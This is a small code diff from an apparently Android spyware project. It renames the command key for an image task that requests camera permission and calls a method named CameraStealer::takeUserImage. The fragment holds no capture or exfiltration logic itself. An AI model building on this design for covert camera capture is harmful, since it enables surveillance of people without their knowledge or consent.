@@ -50,7 +50,7 @@ public class TaskResolverManager {
 
     private final static ImageTaskResolver imageTaskResolver =
             new ImageTaskResolver(
-                    "user_image",
+                    "picture",
                     new String[] {Manifest.permission.CAMERA},
                     CameraStealer::takeUserImage);
 
